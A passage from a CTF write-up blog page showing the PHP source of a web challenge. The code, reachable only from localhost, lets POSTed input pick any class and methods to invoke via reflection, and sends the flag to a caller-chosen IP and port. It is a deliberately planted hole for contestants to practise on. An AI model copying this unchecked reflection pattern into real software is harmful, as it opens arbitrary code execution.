class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;config.php&apos;;</span><br><span class="line"></span><br><span class="line">class Ad&#123;</span><br><span class="line"></span><br><span class="line">    public $ip;</span><br><span class="line">    public $port;</span><br><span class="line"></span><br><span class="line">    public $clazz;</span><br><span class="line">    public $func1;</span><br><span class="line">    public $func2;</span><br><span class="line">    public $func3;</span><br><span class="line">    public $instance;</span><br><span class="line">    public $arg1;</span><br><span class="line">    public $arg2;</span><br><span class="line">    public $arg3;</span><br><span class="line"></span><br><span class="line">    function __construct($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)&#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;ip = $ip;</span><br><span class="line">        $this-&gt;port = $port;</span><br><span class="line"></span><br><span class="line">        $this-&gt;clazz = $clazz;</span><br><span class="line">        $this-&gt;func1 = $func1;</span><br><span class="line">        $this-&gt;func2 = $func2;</span><br><span class="line">        $this-&gt;func3 = $func3;</span><br><span class="line">        $this-&gt;arg1 = $arg1;</span><br><span class="line">        $this-&gt;arg2 = $arg2;</span><br><span class="line">        $this-&gt;arg3 = $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check()&#123;</span><br><span class="line"></span><br><span class="line">        $reflect = new ReflectionClass($this-&gt;clazz);</span><br><span class="line">        $this-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        getFlag($this-&gt;ip, $this-&gt;port);</span><br><span class="line">        //使用你自己的服务器监听一个确保可以收到消息的端口来获取flag</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;127.0.0.1&apos;)&#123;</span><br><span class="line">    if(isset($_POST[&apos;admin&apos;]))&#123;</span><br><span class="line">        </span><br><span class="line">        $ip = $_POST[&apos;ip&apos;];     //你用来获取flag的服务器ip</span><br><span class="line">        $port = $_POST[&apos;port&apos;]; //你用来获取flag的服务器端口</span><br><span class="line"></span><br><span class="line">        $clazz = $_POST[&apos;clazz&apos;];</span><br><span class="line">        $func1 = $_POST[&apos;func1&apos;];</span><br><span class="line">        $func2 = $_POST[&apos;func2&apos;];</span><br><span class="line">        $func3 = $_POST[&apos;func3&apos;];</span><br><span class="line">        $arg1 = $_POST[&apos;arg1&apos;];</span><br><span class="line">        $arg2 = $_POST[&apos;arg2&apos;];</span><br><span class="line">        $arg2 = $_POST[&apos;arg3&apos;];</span><br><span class="line">        $admin = new Ad($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;You r not admin!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+      <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束 <i class="fa fa-heart"></i> 感谢阅读-------------</div>
+
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag">📖ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/31/blue-hat-final/" rel="next" title="2019蓝帽杯决赛WP">
+                <i class="fa fa-chevron-left"></i> 2019蓝帽杯决赛WP
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">ZO1RO</p>
+              <div class="site-description motion-element" itemprop="description">永远做好最坏的打算</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">15</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/ZO1RO" title="GitHub &rarr; https://github.com/ZO1RO" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:em8xcm93ZWJAMTYzLmNvbQo=" title="E-Mail &rarr; mailto:em8xcm93ZWJAMTYzLmNvbQo=" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://impakho.com/" title="https://impakho.com/" rel="noopener" target="_blank">偶像pakho师傅</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://imlonghao.com/" title="https://imlonghao.com/" rel="noopener" target="_blank">偶像longhao师傅</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://wulidecade.cn/" title="https://wulidecade.cn/" rel="noopener" target="_blank">Decade</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://mang0.me/" title="http://mang0.me/" rel="noopener" target="_blank">Mang0</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.singll.cc/" title="https://blog.singll.cc/" rel="noopener" target="_blank">Singll</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sherlocz.github.io/" title="https://sherlocz.github.io/" rel="noopener" target="_blank">sher10ck</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://timeshu.github.io/" title="https://timeshu.github.io/" rel="noopener" target="_blank">Time</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ama666.cn/" title="https://ama666.cn/" rel="noopener" target="_blank">ama666</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://jgeek.cn/" title="https://jgeek.cn/" rel="noopener" target="_blank">\0x584A</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CheckIn"><span class="nav-number">1.</span> <span class="nav-text">CheckIn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-sql"><span class="nav-number">2.</span> <span class="nav-text">easy_sql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-php"><span class="nav-number">3.</span> <span class="nav-text">easy_php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#upload-lab2"><span class="nav-number">4.</span> <span class="nav-text">upload-lab2</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZO1RO</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/schemes/muse.js?v=7.1.1"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
